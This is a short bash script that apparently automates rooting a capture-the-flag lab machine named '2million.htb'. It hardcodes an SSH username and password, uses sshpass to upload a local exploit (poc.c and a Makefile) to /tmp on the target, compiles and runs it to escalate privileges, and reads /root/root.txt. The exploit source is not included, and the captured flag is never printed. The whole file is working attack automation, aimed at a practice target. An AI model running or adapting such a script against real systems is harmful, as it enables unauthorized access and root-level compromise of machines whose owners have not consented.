#!/bin/bash

# Target SSH details
TARGET_HOST="2million.htb"
USER="admin"
PASS="SuperDuperPass123"

# Paths to exploit files on your local machine
LOCAL_POC_C="/home/kali/Desktop/poc.c"
LOCAL_MAKEFILE="/home/kali/Desktop/Makefile"


REMOTE_PATH="/tmp/exploit_files"


echo "[*] Uploading poc.c and Makefile..."
sshpass -p $PASS scp $LOCAL_POC_C $LOCAL_MAKEFILE $USER@$TARGET_HOST:$REMOTE_PATH/


echo "[*] Running 'make' to build the exploit on the target machine..."
sshpass -p $PASS ssh -t $USER@$TARGET_HOST "cd $REMOTE_PATH && make"


echo "[*] Running exploit to escalate privileges..."
sshpass -p $PASS ssh -t $USER@$TARGET_HOST "cd $REMOTE_PATH && ./poc"

# Fetch root flag
echo "[*] Attempting to fetch root flag..."
ROOT_FLAG=$(sshpass -p $PASS ssh $USER@$TARGET_HOST "cat /root/root.txt")


echo "[*] Thankyou for using this pls give me a start : ) "
